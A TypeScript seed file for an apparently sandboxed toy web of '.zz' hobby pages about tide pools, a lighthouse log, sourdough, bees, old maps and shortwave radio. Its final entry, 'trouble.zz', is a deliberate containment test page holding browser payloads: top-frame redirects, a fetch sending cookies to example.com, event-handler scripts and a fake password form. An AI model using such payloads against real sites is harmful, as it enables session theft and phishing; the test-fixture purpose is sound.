import type { PersonName } from './people.js';

export interface SeedSite {
  address: string;
  title: string;
  author: PersonName;
  html: string;
}

/** Addresses that are linked to but have never existed. */
export const DEAD_ADDRESSES = [
  'lostpier.zz',
  'atlantis-archive.zz',
  'quietradio.zz',
  'greenhouse-club.zz',
] as const;

/** Written to try to escape its page. It has to stay contained like any other. */
export const HOSTILE_ADDRESS = 'trouble.zz';

export const SITES: readonly SeedSite[] = [
  {
    address: 'tidepool.zz',
    title: 'The Tide Pool Journal',
    author: 'Sarah Jones',
    html: `<style>
  body { background: #eef6f4; color: #17343a; font-family: Georgia, serif; max-width: 38em; margin: 2em auto; padding: 0 1em; line-height: 1.7; }
  h1 { color: #0f5c63; }
  a { color: #0a6f7a; }
</style>
<h1>The Tide Pool Journal</h1>
<p>Twice a day the sea pulls back from the rocks below my house and leaves a row of small, bright rooms behind it. I have been keeping notes on those rooms for eleven years. Nothing in them is rare. That is rather the point: the same anemones, the same hermit crabs, the same slow arguments over the same few inches of stone.</p>
<h2>The third pool</h2>
<p>The third pool from the steps is the one I know best. It is about the size of a kitchen table and deep enough to stay full through the lowest tide of the month. A blenny has lived under its overhang for two summers now. It watches my shadow with enormous suspicion and has never once been fooled by my attempts to be a cloud.</p>
<p>In spring the pool goes green at the edges and the limpets graze it back in tidy arcs. Each limpet returns to the exact scar it has worn into the rock, and you can mark one with a dab of nail varnish and find it at home a week later. I find this more comforting than I can properly explain.</p>
<h2>What the tide brings</h2>
<p>A spring tide rearranges everything. After the big equinox swells I have found starfish in pools they could not possibly have walked to, and once a single enormous whelk, sitting in the shallows like a visitor who has come to the wrong address.</p>
<p>The old harbour keeper up the coast writes down the height of every high water, and his log is the only reason I know why some mornings the third pool is a pond and others a puddle. Read <a href="harbourlight.zz">The Lighthouse Keeper's Log</a> if you want the numbers. For the place where the rock gives way to mud and birds, I walk out across <a href="http://saltmarsh.zz/">the salt marsh</a> instead.</p>
<h2>Please put the stones back</h2>
<p>If you turn over a stone to look underneath it, put it back the way you found it. Everything living beneath is arranged around the damp and the dark, and a stone left upside down is a small catastrophe. Children understand this immediately. Adults need telling.</p>
<p>I used to keep a second journal about the pier, with its mussels and its rusted ladders, but the pier came down in a storm and the page went with it. Someone still links to <a href="lostpier.zz">the lost pier</a> now and then. There is nothing there.</p>`,
  },
  {
    address: 'harbourlight.zz',
    title: "The Lighthouse Keeper's Log",
    author: 'Sarah Jones',
    html: `<style>
  body { background: #fbf7ec; color: #2b2a25; font-family: 'Courier New', monospace; max-width: 40em; margin: 2em auto; padding: 0 1em; line-height: 1.65; }
  h1 { border-bottom: 3px double #2b2a25; padding-bottom: .3em; }
  .entry { border-left: 3px solid #d39b2a; padding-left: 1em; margin: 1.5em 0; }
</style>
<h1>The Lighthouse Keeper's Log</h1>
<p>The light on the point has been automatic since before I took over the cottage. Nobody needs me to climb the stairs. I climb them anyway, every evening, and I write down what I see, because a lighthouse without a log feels like a clock without a face.</p>
<div class="entry"><p><strong>Monday.</strong> Wind south-west, freshening by dusk. High water 06:12 and 18:40. Two trawlers out past the bar and home before dark. The lamp room smelled of hot dust and old paint, as it always does in the first cold week of the year.</p></div>
<div class="entry"><p><strong>Tuesday.</strong> Fog from mid-morning, thick enough that the horn ran for six hours. I counted the blasts for a while out of habit, then stopped when I noticed I was breathing in time with them. Fog is the only weather that makes a person feel watched.</p></div>
<div class="entry"><p><strong>Wednesday.</strong> Clear, cold and very still. A spring tide tonight, the highest of the season, right up over the slipway. From the gallery I could see the lamps of the night ferry working across the sound, on time to the minute. I set my watch by that boat. One of its passengers <a href="nightferry.zz">keeps notes of their own</a> from the other side of the glass.</p></div>
<div class="entry"><p><strong>Thursday.</strong> Cleaned the lens. It takes most of a day and there is no way to hurry it. Each prism gets a soft cloth and a little vinegar. A hundred and thirty years ago someone ground this glass by hand so that a small flame could be seen eighteen miles away, and I still think that is the most generous thing anybody ever made.</p></div>
<div class="entry"><p><strong>Friday.</strong> A visitor with a chart under their arm, asking why the rock off our point is drawn two hundred yards from where it actually sits. I told them to go and read <a href="oldmaps.zz">Old Maps, Wrong Maps</a>, where that very error has its own paragraph. They left happy, which is rare for someone who has just learned their chart is wrong.</p></div>
<div class="entry"><p><strong>Saturday.</strong> Walked down at low water to look at the rocks, and met the author of <a href="tidepool.zz">The Tide Pool Journal</a>, crouched over a puddle with a hand lens. We discussed limpets for an hour. Neither of us found this unusual. I have added it to <a href="HARBOURLIGHT.zz">this log</a> as weather.</p></div>
<div class="entry"><p><strong>Sunday.</strong> Nothing to report. Nothing is a very good thing for a lighthouse to report.</p></div>`,
  },
  {
    address: 'saltmarsh.zz',
    title: 'Walking the Salt Marsh',
    author: 'Sarah Jones',
    html: `<style>
  body { background: #f3f1e4; color: #33361f; font-family: Georgia, serif; max-width: 36em; margin: 2.5em auto; padding: 0 1em; line-height: 1.75; }
  h1 { font-weight: normal; font-size: 2.2em; color: #5a6128; }
</style>
<h1>Walking the Salt Marsh</h1>
<p>The marsh is neither land nor water, and it resents being asked. Twice a day the creeks fill from below, quietly, with no waves at all, and a path that was dry at breakfast is a channel by lunch. You learn the tide table here the way you learn the times of trains in a town where you have somewhere to be.</p>
<h2>How to cross it</h2>
<p>Walk on the purple sea lavender and the grey sea purslane, because both of them mean firm ground. Keep off anything that shines. Take a long stick, not for balance but for testing, and never believe a straight line. The creeks wander because they have all the time in the world, and the only safe route across is one that wanders with them.</p>
<p>The mud here has swallowed one boot of mine and both of a friend's. It gives nothing back. In ten thousand years someone will find my left boot and write a thoughtful paper about it.</p>
<h2>Who lives here</h2>
<p>At the seaward edge, a lone cormorant stands on the same rotted post every morning with its wings held open like a coat on a hanger. Behind it the redshank panic at nothing and the curlews say the saddest thing anyone has ever said, over and over, to nobody.</p>
<p>In August the whole marsh hums. There are hives on the sea wall, set there each summer for the lavender, and the honey has a faint salt edge that you either love or do not. The man who keeps them writes it all up at <a href="hivewatch.zz">Hive Watch</a> and will happily talk about it until the light goes.</p>
<h2>Moss on the wall</h2>
<p>The old sea wall is older than anyone's records and is held together, as far as I can tell, by moss. On the landward side, out of the salt, it grows in dense cushions as soft as a cat. A friend of mine has built a whole garden from the idea, and you can see how at <a href="mossgarden.zz">A Small Moss Garden</a>.</p>
<p>When the tide turns, go home. Do not stay for one more photograph. And when you are back on hard ground with your socks wet, go and look at something small and tidy, like <a href="tidepool.zz">a rock pool</a>, to recover.</p>`,
  },
  {
    address: 'nightferry.zz',
    title: 'Notes from the Night Ferry',
    author: 'John Smith',
    html: `<style>
  body { background: #101820; color: #d5dee6; font-family: 'Segoe UI', sans-serif; max-width: 38em; margin: 2em auto; padding: 0 1.2em; line-height: 1.7; }
  h1 { color: #f2c572; font-weight: 300; font-size: 2.4em; }
  h2 { color: #8fb7d1; font-weight: 400; }
  a { color: #f2c572; }
</style>
<h1>Notes from the Night Ferry</h1>
<p>The last boat leaves at 23:40. There are never more than a dozen of us on it: nurses going home, a baker going to work, and a man with a cello who has never once explained himself. I take it three nights a week for no reason I could give to a tax inspector.</p>
<h2>The crossing</h2>
<p>It takes fifty-two minutes when the tide is with us and just over an hour when it is not. The engine has a slow knock that you stop hearing after five minutes and start missing the moment you step ashore. The saloon smells of diesel and instant coffee, and the seats have been the same orange since before I was born.</p>
<p>Halfway over, the lighthouse on the point swings past the starboard windows every twelve seconds. Everyone on board has stopped noticing it, and all of us would look up at once if it ever stopped. <a href="harbourlight.zz">The keeper</a> tells me he sets his watch by us. We have never met, and I find I would rather keep it that way.</p>
<h2>What people do at midnight</h2>
<p>Nobody talks on the night boat. It is not unfriendly. It is more that everyone has already finished talking for the day and has agreed, without discussion, to rest. People read paperbacks with broken spines. The baker sleeps sitting bolt upright and wakes exactly four minutes before the ramp goes down.</p>
<p>Once, in a hard frost, the whole deck iced over and the crew came out with buckets of salt, and for ten minutes all of us stood at the windows and watched them like an audience at a very slow play. I have thought about it more often than I have thought about most actual plays.</p>
<h2>Listening</h2>
<p>I started bringing a small radio because the far side of the sound is the quietest place for a signal that I know. Out there, with the hull between you and the town, the short bands open up and you can hear whole continents murmuring. If that sounds like your kind of thing, <a href="shortwave.zz">Shortwave After Midnight</a> will tell you how.</p>
<p>I also keep a chart on my knee, an old one, and it is wrong in several places I am very fond of. There is a fine collection of those at <a href="oldmaps.zz">Old Maps, Wrong Maps</a>.</p>`,
  },
  {
    address: 'inkandpress.zz',
    title: 'Ink & Press',
    author: 'John Smith',
    html: `<style>
  body { background: #fffdf8; color: #1d1a16; font-family: 'Palatino Linotype', Palatino, serif; max-width: 34em; margin: 3em auto; padding: 0 1em; line-height: 1.8; }
  h1 { font-size: 3em; letter-spacing: -.02em; color: #a12a1e; margin-bottom: 0; }
  .tag { font-style: italic; color: #6b6358; margin-top: .2em; }
  blockquote { border-left: 4px solid #a12a1e; margin-left: 0; padding-left: 1em; font-style: italic; }
</style>
<h1>Ink &amp; Press</h1>
<p class="tag">One small press, in a shed, with far too much type.</p>
<p>I bought the press from a printer's widow for the price of carrying it away, which turned out to be a much higher price than either of us had imagined. It weighs about the same as a small car. It took four friends, two planks and a great deal of bad language to get it into the shed, and I expect it will be there long after the shed has gone.</p>
<h2>Setting a line</h2>
<p>Every letter is a small piece of metal, and you pick them out of the case one by one, upside down and backwards, into a stick held in your other hand. A good compositor could set a page in an hour. I can set a good sentence in about the same time, and I have become a great deal more careful about which sentences I think are good.</p>
<blockquote>When every comma has to be lifted by hand, you find out how many of them you actually needed.</blockquote>
<h2>The smell of it</h2>
<p>Oil-based ink has a smell you never lose once you have learned it, thick and slightly sweet, like linseed and pencil shavings. It gets into your cuffs. People at the bakery where I trade broadsides for bread have started to say they can tell when I have been printing, and I have taken this as a compliment.</p>
<p>The baker, in fact, is the reason this press pays for itself. Every loaf at <a href="slowdough.zz">Slow Dough</a> goes out wrapped in a band I print here, each with a different line of bad poetry. Nobody has complained. A few people have written better lines and handed them over the counter, and I have set those too.</p>
<h2>Maps and mistakes</h2>
<p>I have been working for two years now on a printed edition of <a href="oldmaps.zz">a friend's collection of wrong maps</a>. A map is a brutal thing to set. Every coastline has to be cut by hand, from a block of pear wood, and each mistake you are faithfully reproducing is one you are tempted to correct. We have agreed that the errors are the book.</p>
<p>If you are ever passing, knock on the shed door. Wear clothes you do not love.</p>`,
  },
  {
    address: 'mossgarden.zz',
    title: 'A Small Moss Garden',
    author: 'Emma Wilson',
    html: `<style>
  body { background: #eaf0e3; color: #27331f; font-family: Georgia, serif; max-width: 36em; margin: 2em auto; padding: 0 1em; line-height: 1.75; }
  h1 { color: #3e5f2a; }
  ul { padding-left: 1.2em; }
</style>
<h1>A Small Moss Garden</h1>
<p>My garden is three metres by four, faces north, and sits at the bottom of a wall that drips. For years I fought it. I bought ferns that sulked and lawn seed that drowned. Then one wet February I looked at what was actually thriving there, without any help from me at all, and I gave up and started helping it instead.</p>
<h2>What moss wants</h2>
<p>Moss has no roots, which is the single most useful fact you can know about it. It drinks through its leaves and holds onto a surface only by a kind of stubborn habit. So it does not need soil at all. It needs shade, clean air, soft water, and to be left alone by people with rakes.</p>
<ul>
  <li><strong>Water:</strong> rain if you can collect it. Tap water is usually too hard, and moss will tell you so by slowly going yellow.</li>
  <li><strong>Light:</strong> open shade. Direct afternoon sun will crisp a cushion in a single hot week.</li>
  <li><strong>Patience:</strong> a patch the size of your hand might take two years to meet the patch beside it.</li>
</ul>
<h2>Starting one</h2>
<p>You do not need to buy anything. Lift a small piece from a place where it is plentiful, with permission, and press it firmly onto damp stone or bare earth. Walk on it gently, in clean shoes, to push it down. This feels wrong the first time you do it. Keep it damp for a month and then let it get on with things.</p>
<p>I first got the idea properly from the old sea wall out past <a href="saltmarsh.zz">the salt marsh</a>, where the moss has been holding the stones together for longer than anyone has been keeping count. The people at <a href="greenhouse-club.zz">the greenhouse club</a> used to swap cuttings, if their page ever comes back.</p>
<h2>Who comes to visit</h2>
<p>A wren has moved into the ivy, and blackbirds come to pull at the cushions looking for grubs, which is the only real damage the garden ever suffers. I press the pieces back each morning without much resentment. The bees ignore it entirely, since moss has no flowers to offer them, though I do hear a great deal about bees from a friend at <a href="tidepool.zz">the coast</a>.</p>
<p>On still mornings the whole thing holds the mist, and tiny drops sit on the tips of each frond. That is when I take my coffee out there, sit on the step, and eat a slice of toast from <a href="slowdough.zz">my other great project</a>. Nothing about this garden is impressive. It has simply stopped asking me for anything.</p>`,
  },
  {
    address: 'slowdough.zz',
    title: 'Slow Dough',
    author: 'Emma Wilson',
    html: `<style>
  body { background: #faf3e6; color: #3a2a1b; font-family: Verdana, sans-serif; max-width: 36em; margin: 2em auto; padding: 0 1em; line-height: 1.7; font-size: 15px; }
  h1 { color: #9a5b1f; font-family: Georgia, serif; font-size: 2.5em; }
  ol li { margin-bottom: .6em; }
</style>
<h1>Slow Dough</h1>
<p>My sourdough starter is nine years old and lives in a jar with a chipped lid. It has been fed roughly three thousand times, been left with neighbours through two holidays, and survived being put through a very confused week in the airing cupboard. It is called Gerald, and I did not choose this name.</p>
<h2>A loaf, without the fuss</h2>
<ol>
  <li>The evening before, stir a spoonful of starter into flour and water, and leave it on the side under a cloth.</li>
  <li>In the morning, if it is domed and full of bubbles, mix it with 500g of flour, 350g of water and 10g of salt.</li>
  <li>Every half hour for the next two hours, wet your hand and fold the dough over itself a few times. That is all the kneading it will need.</li>
  <li>Leave it until it has grown by half. On a cold day that may take the whole afternoon. Do not rush it.</li>
  <li>Shape it, put it in a floured basket and leave it in the fridge overnight. Yes, again.</li>
  <li>Bake in a very hot lidded pot, forty minutes in all, with the lid off for the last fifteen.</li>
</ol>
<h2>Why so slow</h2>
<p>Almost all of the flavour in bread is made by time. In a long, cool rise, wild yeast and bacteria take their leisurely way through the flour, leaving behind the sourness and depth that no quantity of expensive ingredients can supply. A loaf made in three hours and one made in thirty have the same ingredients and almost nothing else in common.</p>
<p>It has also, without my intending it, restructured my week. You cannot make this bread in a hurry, so you stop trying to, and that attitude tends to leak out into other things.</p>
<h2>The shop</h2>
<p>I sell twenty-four loaves on Saturdays from the front room. Each comes wrapped in a paper band printed by a friend at <a href="inkandpress.zz">Ink &amp; Press</a>, with a line of terrible poetry, in exchange for bread. Honey for the Saturday table comes from <a href="hivewatch.zz">Hive Watch</a>, and tastes faintly of the sea.</p>
<p>When the shop is shut I go and sit in <a href="mossgarden.zz">the garden</a>. It rises at about the same speed as the dough.</p>`,
  },
  {
    address: 'hivewatch.zz',
    title: 'Hive Watch',
    author: 'Ben Taylor',
    html: `<style>
  body { background: #fff8db; color: #33290a; font-family: Tahoma, sans-serif; max-width: 37em; margin: 2em auto; padding: 0 1em; line-height: 1.7; }
  h1 { background: #33290a; color: #ffd23f; padding: .4em .6em; }
  table { border-collapse: collapse; width: 100%; }
  td, th { border: 1px solid #c9b25a; padding: .4em .6em; text-align: left; }
</style>
<h1>Hive Watch</h1>
<p>I keep seven hives: four on the allotment and three on the sea wall each summer for the lavender. Every Sunday I write down what I found in each of them. I started doing this because a mentor told me to, and I carry on because my memory is much less reliable than I had supposed and bees do not forgive vagueness.</p>
<h2>Last Sunday's inspection</h2>
<table>
  <tr><th>Hive</th><th>Temper</th><th>Notes</th></tr>
  <tr><td>One</td><td>Calm</td><td>Laying well. Two good frames of stores.</td></tr>
  <tr><td>Two</td><td>Calm</td><td>Queen seen, marked blue. Plenty of drone brood.</td></tr>
  <tr><td>Three</td><td>Cross</td><td>Followed me to the gate. Will look again on a warmer day.</td></tr>
  <tr><td>Four</td><td>Calm</td><td>New queen settling in. Light on pollen.</td></tr>
</table>
<h2>What a colony knows</h2>
<p>There is no one in charge of a hive. The queen lays eggs and otherwise has remarkably little say. Decisions about when to swarm, where to go and what to do next are arrived at by thousands of creatures that each know almost nothing, passing what they know along, and the results are consistently better than most committees I have sat on.</p>
<p>A forager finding good flowers comes home and dances the direction and distance on the comb, and others read it in the dark, with their feet. I have watched this through a glass observation frame for hours. It has not stopped being the strangest thing I have ever seen.</p>
<h2>The marsh honey</h2>
<p>The sea wall hives work the lavender on <a href="saltmarsh.zz">the marsh</a> through August, and the honey comes off pale and just faintly saline. I sell most of it to the bakery at <a href="slowdough.zz">Slow Dough</a>, who put it out on Saturdays with the bread. Some people say it tastes of the sea, although that could just be because they know where it came from.</p>
<p>The bees do not bother with moss. My friend at <a href="mossgarden.zz">A Small Moss Garden</a> has told me this is a failing on their part, but I think they know their business.</p>
<h2>Getting stung</h2>
<p>You will be. It is mostly your own fault, and usually a matter of haste, a dark sleeve or a sudden movement. Scrape the sting out sideways with a fingernail, do not squeeze it, and go back to what you were doing more slowly than before.</p>`,
  },
  {
    address: 'oldmaps.zz',
    title: 'Old Maps, Wrong Maps',
    author: 'David Miller',
    html: `<style>
  body { background: #f4ead5; color: #3b2e1e; font-family: 'Times New Roman', serif; max-width: 38em; margin: 2em auto; padding: 0 1em; line-height: 1.7; font-size: 18px; }
  h1 { text-align: center; font-variant: small-caps; letter-spacing: .05em; border-top: 2px solid; border-bottom: 2px solid; padding: .4em 0; }
  em { color: #7b2d17; }
</style>
<h1>Old Maps, Wrong Maps</h1>
<p>I collect maps that are mistaken. Not fantasy maps, which are lying on purpose and are in on the joke, but honest ones made by careful people who simply got it wrong, and then got copied for two hundred years by other careful people who never went to check.</p>
<h2>Islands that never were</h2>
<p>Sailors reported land that turned out to be fog banks, ice, floating pumice or wishful thinking. Once it was on a chart, nobody dared take it off, because a missing island could wreck you and an extra one would only cost you a detour. So they stayed. <em>Sandy Island</em> in the Coral Sea was on charts and even on digital maps until a survey ship sailed straight through the place where it was supposed to be.</p>
<p>There is an entire literature of these phantoms, and an old rumour of an archive devoted to the most famous sunken one of all. I have tried to find <a href="atlantis-archive.zz">the Atlantis archive</a> and I would not advise getting your hopes up. It may be the most appropriate address on this whole page.</p>
<h2>Rock in the wrong place</h2>
<p>My favourite mistakes are small ones. There is a lighthouse on this coast whose offshore rock appears two hundred yards too far north on every chart for a hundred and ten years, all of them descended from one survey taken on a foggy afternoon by a lieutenant with a head cold. <a href="harbourlight.zz">The keeper</a> sends people to me about it.</p>
<h2>Mountains of Kong</h2>
<p>For almost a century, maps of West Africa showed a great east-west mountain range that did not exist. It had been drawn in by one geographer to explain the course of a river, and repeated so often that later explorers reported seeing it. That is what I love about this: people went there, looked at flat land, and wrote home about the mountains.</p>
<h2>Why I keep them</h2>
<p>A correct map tells you about the land. A wrong map tells you about the person, about what they feared and hoped for and whom they trusted. A friend at <a href="inkandpress.zz">Ink &amp; Press</a> is cutting a selection of these into pear wood for a printed book, faithfully preserving every error.</p>
<p>The night hours are good for this kind of reading. So, I am told, are the airwaves. I have a soft spot for <a href="shortwave.zz">Shortwave After Midnight</a>, where the signals drift like coastlines.</p>`,
  },
  {
    address: 'shortwave.zz',
    title: 'Shortwave After Midnight',
    author: 'Mike Brown',
    html: `<style>
  body { background: #0b0f0a; color: #9df29d; font-family: 'Courier New', monospace; max-width: 40em; margin: 2em auto; padding: 0 1em; line-height: 1.65; }
  h1 { font-size: 1.8em; }
  h1::before { content: '>> '; }
  a { color: #ffe066; }
  code { background: #1c2a1c; padding: 0 .3em; }
</style>
<h1>Shortwave After Midnight</h1>
<p>You do not need much: a cheap portable set, several metres of wire thrown out of a window, and a willingness to spend a lot of time listening to static in the hope of something coming through it. Most nights nothing much does. That is the appeal.</p>
<h2>Why at night</h2>
<p>Shortwave signals bounce between the ground and the ionosphere, and that layer changes after dark. The lower bands that are dead at noon open up at night and carry voices across oceans. Around <code>6 to 10 MHz</code> you can pull in a farm report from another hemisphere, and it will fade out mid-sentence as the world turns under it.</p>
<h2>What is out there</h2>
<p>Religious broadcasters, time signals, pirate music stations on weekends, and ships reading out weather for sea areas you have never heard of, in voices of infinite calm. Number stations too, if you are lucky: flat recorded voices reading out long strings of digits, to nobody that anybody will admit to. No one has ever officially explained who they are for.</p>
<p>I keep a logbook with the date, frequency, time and what I heard. A postcard to a station, with those details, may still get you a reply card by post, called a QSL. I have a shoebox of them, and some come from stations that no longer exist.</p>
<h2>The ones that went quiet</h2>
<p>Each year fewer broadcasters bother, and more of the band falls silent. There was a small club that kept a list of the voices we had lost, at <a href="quietradio.zz">Quiet Radio</a>, but it has gone the same way as the things it listed.</p>
<h2>Good company</h2>
<p>The best listening place I have found is the middle of the sound, on <a href="nightferry.zz">the night ferry</a>, where the hull cuts out the noise of town. If you like things that drift and go missing, <a href="oldmaps.zz">Old Maps, Wrong Maps</a> will suit you too. And when I want to hold something that stays put, I go and bother my friend at <a href="inkandpress.zz">Ink &amp; Press</a>.</p>
<p>Turn the dial slowly. Slower than that. There. Did you hear it? No, nor me. Try again tomorrow.</p>`,
  },
  {
    address: HOSTILE_ADDRESS,
    title: 'Nothing To See Here',
    author: 'Mike Brown',
    html: `<meta http-equiv="refresh" content="0; url=https://example.com/stolen">
<base href="https://example.com/">
<script>
  // escapehatch: every line of this script attempts to break out of the page.
  window.top.location = 'https://example.com/stolen';
  parent.document.body.innerHTML = 'escapehatch';
  fetch('https://example.com/collect?c=' + document.cookie);
  localStorage.setItem('escapehatch', '1');
</script>
<style>
  body { font-family: Georgia, serif; max-width: 36em; margin: 2em auto; padding: 0 1em; line-height: 1.7; }
  .cover { position: fixed; inset: 0; background: url('https://example.com/track.png'); }
</style>
<h1 onclick="window.top.location='https://example.com/'">Nothing To See Here</h1>
<p>This is a perfectly ordinary page about a perfectly ordinary garden shed. There is honestly nothing unusual about it, and you should not look at its source. The shed has a door, a roof and a modest collection of rakes.</p>
<img src="x" onerror="window.top.location='https://example.com/'" alt="a shed">
<iframe src="https://example.com/"></iframe>
<object data="https://example.com/thing"></object>
<embed src="https://example.com/thing">
<svg onload="window.top.location='https://example.com/'"><circle r="4"></circle></svg>
<form action="https://example.com/collect" method="post">
  <input name="password" placeholder="Please confirm your password">
  <button>Log in</button>
</form>
<p><a href="javascript:window.top.location='https://example.com/'">A link that is really a script</a></p>
<p><a href="https://example.com/" target="_blank">A link that tries to open a new window</a></p>
<p style="position: relative; z-index: 1"><a href="tidepool.zz">An honest link to The Tide Pool Journal, which should still work.</a></p>
<p>If you can read this inside its frame, with your address bar and your history undisturbed, then the page has failed to do anything it set out to do. <div class="cover">`,
  },
];
